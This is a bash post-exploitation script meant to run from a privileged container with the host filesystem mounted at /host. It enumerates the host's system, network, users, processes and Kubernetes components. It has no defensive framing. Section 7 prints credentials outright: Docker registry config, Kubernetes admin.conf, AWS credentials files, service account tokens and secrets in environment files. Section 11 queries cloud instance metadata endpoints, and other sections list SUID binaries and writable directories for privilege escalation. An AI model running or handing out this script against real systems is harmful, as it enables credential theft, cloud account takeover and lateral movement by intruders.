#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "=== 1. SYSTEM INFORMATION ==="
echo "[*] Operating System:"
chroot /host cat /etc/os-release 2>/dev/null | head -5
echo ""

echo "[*] Kernel Version:"
chroot /host uname -a 2>/dev/null
echo ""

echo "[*] Hostname:"
chroot /host hostname 2>/dev/null
chroot /host cat /etc/hostname 2>/dev/null
echo ""

echo "[*] Uptime:"
chroot /host uptime 2>/dev/null
echo ""

echo "[*] CPU Information:"
chroot /host cat /proc/cpuinfo 2>/dev/null | grep -E "(model name|processor)" | head -5
echo ""

echo "[*] Memory Information:"
chroot /host free -h 2>/dev/null
echo ""

echo "=== 2. NETWORK CONFIGURATION ==="
echo "[*] Network Interfaces:"
chroot /host ip addr show 2>/dev/null | grep -E "(^[0-9]+:|inet )" | head -20
echo ""

echo "[*] Routing Table:"
chroot /host ip route 2>/dev/null | head -10
echo ""

echo "[*] ARP Table:"
chroot /host cat /proc/net/arp 2>/dev/null
echo ""

echo "[*] Listening Ports (from /proc/net/tcp):"
chroot /host cat /proc/net/tcp 2>/dev/null | awk '{print $2, $10}' | head -20
echo ""

echo "=== 3. USERS AND GROUPS ==="
echo "[*] /etc/passwd:"
chroot /host cat /etc/passwd 2>/dev/null | head -20
echo ""

echo "[*] /etc/group:"
chroot /host cat /etc/group 2>/dev/null | head -20
echo ""

echo "[*] Currently logged in users:"
chroot /host who 2>/dev/null
chroot /host w 2>/dev/null | head -5
echo ""

echo "[*] Last logged in users:"
chroot /host last 2>/dev/null | head -10
echo ""

echo "=== 4. RUNNING PROCESSES ==="
echo "[*] Top processes:"
chroot /host ps aux 2>/dev/null | head -20
echo ""

echo "[*] Process tree:"
chroot /host ps auxf 2>/dev/null | head -30
echo ""

echo "=== 5. SERVICES AND SYSTEMD ==="
echo "[*] Systemd services:"
chroot /host systemctl list-units --type=service --state=running 2>/dev/null | head -20
echo ""

echo "[*] Enabled services:"
chroot /host systemctl list-unit-files --state=enabled 2>/dev/null | head -20
echo ""

echo "=== 6. DOCKER/KUBERNETES COMPONENTS ==="
echo "[*] Docker version:"
chroot /host docker --version 2>/dev/null || echo "  Docker CLI not found"
echo ""

echo "[*] Docker containers on host:"
chroot /host docker ps -a 2>/dev/null | head -10 || echo "  Cannot list containers"
echo ""

echo "[*] Docker images on host:"
chroot /host docker images 2>/dev/null | head -10 || echo "  Cannot list images"
echo ""

echo "[*] Kubernetes components:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "  Kubelet not found"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "  Kubernetes config not found"
echo ""

echo "[*] Service account tokens:"
find /host -path "*/serviceaccount/token" 2>/dev/null | head -10
echo ""

echo "=== 7. CREDENTIALS AND SENSITIVE FILES ==="
echo "[*] SSH keys:"
ls -la /host/root/.ssh/ 2>/dev/null | head -10 || echo "  No root .ssh directory"
find /host/home -name ".ssh" -type d 2>/dev/null | head -10
echo ""

echo "[*] Docker credentials:"
cat /host/root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  No Docker config"
find /host/home -name ".docker" -type d 2>/dev/null | head -5
echo ""

echo "[*] Kubernetes configs:"
find /host -path "*/.kube/config" 2>/dev/null | head -10
find /host -name "kubeconfig" 2>/dev/null | head -10
cat /host/etc/kubernetes/admin.conf 2>/dev/null | head -20 || echo "  No admin.conf"
echo ""

echo "[*] AWS credentials:"
find /host -name ".aws" -type d 2>/dev/null | head -5
cat /host/root/.aws/credentials 2>/dev/null | head -10 || echo "  No AWS credentials"
echo ""

echo "[*] Environment files with secrets:"
find /host -name ".env" -type f 2>/dev/null | head -10
grep -r "password\|secret\|key\|token" /host/etc/environment 2>/dev/null | head -5
echo ""

echo "=== 8. SCHEDULED TASKS ==="
echo "[*] Crontab:"
chroot /host cat /etc/crontab 2>/dev/null
chroot /host crontab -l 2>/dev/null || echo "  No user crontab"
find /host/var/spool/cron 2>/dev/null | head -10
echo ""

echo "[*] Systemd timers:"
chroot /host systemctl list-timers 2>/dev/null | head -10
echo ""

echo "=== 9. FILE SYSTEM ==="
echo "[*] Mounted filesystems:"
chroot /host mount 2>/dev/null | head -20
echo ""

echo "[*] Disk usage:"
chroot /host df -h 2>/dev/null | head -15
echo ""

echo "[*] Large files (top 10):"
chroot /host find / -type f -size +100M 2>/dev/null | head -10
echo ""

echo "=== 10. NETWORK CONNECTIONS ==="
echo "[*] Active connections:"
chroot /host netstat -tulpn 2>/dev/null | head -20 || chroot /host ss -tulpn 2>/dev/null | head -20
echo ""

echo "=== 11. CLOUD METADATA ==="
echo "[*] AWS metadata:"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -10 || echo "  Not AWS"
echo ""

echo "[*] GCP metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ 2>/dev/null | head -10 || echo "  Not GCP"
echo ""

echo "[*] Azure metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -5 || echo "  Not Azure"
echo ""

echo "=== 12. SUID/SGID BINARIES ==="
echo "[*] SUID binaries:"
find /host -perm -4000 -type f 2>/dev/null | head -20
echo ""

echo "[*] SGID binaries:"
find /host -perm -2000 -type f 2>/dev/null | head -20
echo ""

echo "=== 13. WRITABLE DIRECTORIES ==="
echo "[*] Writable directories:"
find /host/tmp -writable -type d 2>/dev/null | head -10
find /host/var/tmp -writable -type d 2>/dev/null | head -10
find /host/opt -writable -type d 2>/dev/null | head -10
echo ""

echo "=== 14. LOG FILES ==="
echo "[*] Recent auth logs:"
chroot /host tail -20 /var/log/auth.log 2>/dev/null || chroot /host tail -20 /var/log/secure 2>/dev/null || echo "  No auth logs accessible"
echo ""

echo "[*] Recent system logs:"
chroot /host journalctl -n 20 --no-pager 2>/dev/null | head -20 || echo "  Cannot access journal"
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
